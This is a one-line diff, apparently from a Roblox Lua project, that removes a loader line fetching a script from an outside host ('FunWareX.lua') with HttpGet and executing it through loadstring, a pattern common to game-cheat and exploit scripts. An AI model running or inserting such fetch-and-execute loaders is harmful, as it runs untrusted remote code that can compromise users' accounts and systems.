@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://androssy.net/TrashXenon/FunWareX.lua", true))()
